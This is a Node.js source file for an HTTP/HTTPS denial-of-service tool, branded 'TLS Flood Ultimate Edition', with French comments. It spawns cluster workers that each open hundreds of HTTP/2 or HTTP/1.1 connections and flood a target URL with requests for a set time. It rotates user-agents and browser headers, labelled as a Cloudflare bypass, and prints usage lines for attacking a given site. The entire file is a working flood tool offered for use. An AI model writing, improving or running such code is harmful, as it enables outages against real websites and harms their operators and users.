/*
 * ╔═══════════════════════════════════════════════════════════════════╗
 * ║           TLS FLOOD - NODE.JS ULTIMATE EDITION                    ║
 * ║     Maximum performance HTTP/HTTPS flood en JavaScript            ║
 * ╚═══════════════════════════════════════════════════════════════════╝
 * 
 * Installation:
 *   npm install
 * 
 * Usage:
 *   node tls.js <url> <time> <threads> [proxy_file] [ua_file]
 */

const cluster = require('cluster');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');
const { performance } = require('perf_hooks');

// ============================================================================
// CONFIGURATION NUCLÉAIRE
// ============================================================================

const CONFIG = {
    MAX_SOCKETS_PER_WORKER: 500,
    REQUESTS_PER_SOCKET: 100,        // Pipeline aggressive
    SOCKET_TIMEOUT: 10000,
    RECONNECT_DELAY: 100,
    USE_HTTP2: true,
    USE_CUSTOM_TLS: true,
};

// ============================================================================
// TLS FINGERPRINT CLOUDFLARE BYPASS
// ============================================================================

const TLS_CONFIG = {
    ciphers: [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
    ].join(':'),
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
    honorCipherOrder: false,
    rejectUnauthorized: false,
    sessionIdContext: crypto.randomBytes(32).toString('hex'),
    secureOptions: 
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_COMPRESSION,
};

// ============================================================================
// USER-AGENTS RÉALISTES
// ============================================================================

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
];

const ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'fr-FR,fr;q=0.9,en;q=0.8',
];

// ============================================================================
// UTILITIES
// ============================================================================

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function loadFile(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

// ============================================================================
// HEADERS CLOUDFLARE BYPASS
// ============================================================================

function buildHeaders(target, options = {}) {
    const ua = options.userAgent || randomElement(USER_AGENTS);
    const isChrome = ua.includes('Chrome');
    
    const headers = {
        ':method': 'GET',
        ':path': target.path || '/',
        ':scheme': target.protocol === 'https:' ? 'https' : 'http',
        ':authority': target.host,
        'user-agent': ua,
        'accept': randomElement(ACCEPT_HEADERS),
        'accept-language': randomElement(LANGUAGES),
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': Math.random() > 0.5 ? 'max-age=0' : 'no-cache',
        'upgrade-insecure-requests': '1',
    };
    
    if (isChrome) {
        headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = '"Windows"';
        headers['sec-fetch-site'] = 'none';
        headers['sec-fetch-mode'] = 'navigate';
        headers['sec-fetch-user'] = '?1';
        headers['sec-fetch-dest'] = 'document';
    }
    
    if (options.cookie) {
        headers['cookie'] = options.cookie;
    }
    
    if (options.referer) {
        headers['referer'] = options.referer;
    }
    
    return headers;
}

// ============================================================================
// HTTP/2 CLIENT OPTIMISÉ
// ============================================================================

class HTTP2Client {
    constructor(target, options = {}) {
        this.target = target;
        this.options = options;
        this.client = null;
        this.requestCount = 0;
        this.responseCount = 0;
        this.connected = false;
        this.cookies = '';
    }
    
    connect() {
        return new Promise((resolve, reject) => {
            const clientOptions = {
                ...TLS_CONFIG,
                ALPNProtocols: ['h2', 'http/1.1'],
            };
            
            this.client = http2.connect(
                `${this.target.protocol}//${this.target.host}`,
                clientOptions
            );
            
            this.client.on('connect', () => {
                this.connected = true;
                resolve();
            });
            
            this.client.on('error', (err) => {
                this.connected = false;
                reject(err);
            });
            
            this.client.on('close', () => {
                this.connected = false;
            });
            
            setTimeout(() => reject(new Error('Timeout')), 5000);
        });
    }
    
    async flood(duration) {
        const endTime = Date.now() + duration;
        
        while (Date.now() < endTime && this.connected) {
            // Envoyer plusieurs requêtes en parallèle
            const promises = [];
            for (let i = 0; i < 10; i++) {
                promises.push(this.sendRequest());
            }
            
            await Promise.race([
                Promise.all(promises),
                new Promise(resolve => setTimeout(resolve, 10))
            ]);
        }
    }
    
    sendRequest() {
        return new Promise((resolve) => {
            if (!this.connected) {
                resolve();
                return;
            }
            
            const headers = buildHeaders(this.target, {
                userAgent: this.options.userAgent,
                cookie: this.cookies,
            });
            
            const req = this.client.request(headers);
            this.requestCount++;
            
            req.on('response', (headers) => {
                // Extraire cookies
                if (headers['set-cookie']) {
                    const cookies = Array.isArray(headers['set-cookie']) 
                        ? headers['set-cookie'] 
                        : [headers['set-cookie']];
                    
                    cookies.forEach(cookie => {
                        const match = cookie.match(/^([^=]+)=([^;]+)/);
                        if (match) {
                            this.cookies += `${match[1]}=${match[2]}; `;
                        }
                    });
                }
                
                this.responseCount++;
            });
            
            req.on('data', () => {});
            req.on('end', () => resolve());
            req.on('error', () => resolve());
            
            req.end();
        });
    }
    
    destroy() {
        if (this.client) {
            this.client.destroy();
        }
    }
}

// ============================================================================
// HTTP/1.1 CLIENT OPTIMISÉ (fallback)
// ============================================================================

class HTTP1Client {
    constructor(target, options = {}) {
        this.target = target;
        this.options = options;
        this.agent = null;
        this.requestCount = 0;
        this.responseCount = 0;
    }
    
    connect() {
        const agentOptions = {
            maxSockets: Infinity,
            maxFreeSockets: 256,
            timeout: CONFIG.SOCKET_TIMEOUT,
            keepAlive: true,
            keepAliveMsecs: 1000,
        };
        
        if (this.target.protocol === 'https:') {
            this.agent = new https.Agent({
                ...agentOptions,
                ...TLS_CONFIG,
            });
        } else {
            this.agent = new http.Agent(agentOptions);
        }
        
        return Promise.resolve();
    }
    
    async flood(duration) {
        const endTime = Date.now() + duration;
        
        while (Date.now() < endTime) {
            const promises = [];
            for (let i = 0; i < 50; i++) {
                promises.push(this.sendRequest());
            }
            
            await Promise.race([
                Promise.all(promises),
                new Promise(resolve => setTimeout(resolve, 10))
            ]);
        }
    }
    
    sendRequest() {
        return new Promise((resolve) => {
            const headers = {
                'Host': this.target.host,
                'User-Agent': this.options.userAgent || randomElement(USER_AGENTS),
                'Accept': randomElement(ACCEPT_HEADERS),
                'Accept-Language': randomElement(LANGUAGES),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            };
            
            const requestOptions = {
                method: 'GET',
                hostname: this.target.hostname,
                port: this.target.port,
                path: this.target.path || '/',
                headers: headers,
                agent: this.agent,
            };
            
            const lib = this.target.protocol === 'https:' ? https : http;
            
            const req = lib.request(requestOptions, (res) => {
                this.responseCount++;
                res.on('data', () => {});
                res.on('end', () => resolve());
            });
            
            this.requestCount++;
            
            req.on('error', () => resolve());
            req.on('timeout', () => {
                req.destroy();
                resolve();
            });
            
            req.end();
        });
    }
    
    destroy() {
        if (this.agent) {
            this.agent.destroy();
        }
    }
}

// ============================================================================
// WORKER PROCESS
// ============================================================================

async function workerMain(target, duration, options) {
    console.log(`[Worker ${process.pid}] Starting with ${CONFIG.MAX_SOCKETS_PER_WORKER} clients`);
    
    const clients = [];
    const startTime = Date.now();
    
    // Créer clients
    for (let i = 0; i < CONFIG.MAX_SOCKETS_PER_WORKER; i++) {
        const ClientClass = CONFIG.USE_HTTP2 ? HTTP2Client : HTTP1Client;
        const client = new ClientClass(target, {
            userAgent: options.userAgents ? randomElement(options.userAgents) : undefined,
        });
        
        try {
            await client.connect();
            clients.push(client);
        } catch (err) {
            // Ignorer erreurs de connexion
        }
        
        // Petit délai entre connexions
        if (i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 10));
        }
    }
    
    console.log(`[Worker ${process.pid}] Connected ${clients.length} clients`);
    
    // Lancer flood
    const floodPromises = clients.map(client => client.flood(duration));
    
    // Monitoring
    const monitorInterval = setInterval(() => {
        const totalReq = clients.reduce((sum, c) => sum + c.requestCount, 0);
        const totalRes = clients.reduce((sum, c) => sum + c.responseCount, 0);
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalReq / elapsed);
        
        console.log(`[Worker ${process.pid}] ${totalReq} req | ${rps} RPS | ${totalRes} responses`);
    }, 2000);
    
    // Attendre fin
    await Promise.race([
        Promise.all(floodPromises),
        new Promise(resolve => setTimeout(resolve, duration))
    ]);
    
    clearInterval(monitorInterval);
    
    // Cleanup
    clients.forEach(client => client.destroy());
    
    const totalReq = clients.reduce((sum, c) => sum + c.requestCount, 0);
    console.log(`[Worker ${process.pid}] Finished: ${totalReq} total requests`);
    
    process.send({ 
        type: 'stats', 
        requests: totalReq,
        responses: clients.reduce((sum, c) => sum + c.responseCount, 0)
    });
}

// ============================================================================
// MASTER PROCESS
// ============================================================================

function masterMain(targetUrl, duration, numWorkers, options = {}) {
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║          🔥 TLS FLOOD - NODE.JS ULTIMATE EDITION 🔥           ║');
    console.log('╚════════════════════════════════════════════════════════════════╝\n');
    
    const target = url.parse(targetUrl);
    
    console.log(`Target:      ${target.host}`);
    console.log(`Protocol:    ${target.protocol === 'https:' ? 'HTTPS' : 'HTTP'}`);
    console.log(`Duration:    ${duration}ms (${duration/1000}s)`);
    console.log(`Workers:     ${numWorkers}`);
    console.log(`HTTP/2:      ${CONFIG.USE_HTTP2 ? 'YES' : 'NO'}`);
    console.log(`Clients:     ${CONFIG.MAX_SOCKETS_PER_WORKER} per worker`);
    console.log(`Total:       ${numWorkers * CONFIG.MAX_SOCKETS_PER_WORKER} connections`);
    console.log('');
    
    const startTime = Date.now();
    let totalRequests = 0;
    let totalResponses = 0;
    let workersFinished = 0;
    
    // Lancer workers
    for (let i = 0; i < numWorkers; i++) {
        const worker = cluster.fork();
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalRequests += msg.requests;
                totalResponses += msg.responses;
                workersFinished++;
                
                if (workersFinished === numWorkers) {
                    const elapsed = (Date.now() - startTime) / 1000;
                    const avgRps = Math.floor(totalRequests / elapsed);
                    
                    console.log('\n╔════════════════════════════════════════════════════════════════╗');
                    console.log('║                    FINAL STATISTICS                            ║');
                    console.log('╠════════════════════════════════════════════════════════════════╣');
                    console.log(`║  Total Requests:  ${totalRequests.toString().padEnd(15)} ║`);
                    console.log(`║  Responses:       ${totalResponses.toString().padEnd(15)} ║`);
                    console.log(`║  Average RPS:     ${avgRps.toString().padEnd(15)} ║`);
                    console.log(`║  Duration:        ${elapsed.toFixed(2)}s${' '.repeat(11)} ║`);
                    console.log('╚════════════════════════════════════════════════════════════════╝\n');
                    
                    process.exit(0);
                }
            }
        });
        
        worker.send({ 
            type: 'start', 
            target: target, 
            duration: duration,
            options: options
        });
    }
}

// ============================================================================
// MAIN
// ============================================================================

if (cluster.isMaster || cluster.isPrimary) {
    // MASTER
    const args = process.argv.slice(2);
    
    if (args.length < 3) {
        console.log('TLS FLOOD - Node.js Ultimate Edition\n');
        console.log('Usage: node tls.js <url> <time> <workers> [proxy_file] [ua_file]\n');
        console.log('Examples:');
        console.log('  node tls.js https://target.com 60 10');
        console.log('  node tls.js https://target.com 60 20 proxies.txt useragents.txt\n');
        process.exit(1);
    }
    
    const targetUrl = args[0];
    const durationSec = parseInt(args[1]);
    const numWorkers = parseInt(args[2]);
    
    const options = {};
    
    if (args[3]) {
        options.proxies = loadFile(args[3]);
        console.log(`[+] Loaded ${options.proxies.length} proxies`);
    }
    
    if (args[4]) {
        options.userAgents = loadFile(args[4]);
        console.log(`[+] Loaded ${options.userAgents.length} user-agents`);
    }
    
    masterMain(targetUrl, durationSec * 1000, numWorkers, options);
    
} else {
    // WORKER
    process.on('message', async (msg) => {
        if (msg.type === 'start') {
            await workerMain(msg.target, msg.duration, msg.options);
        }
    });
}
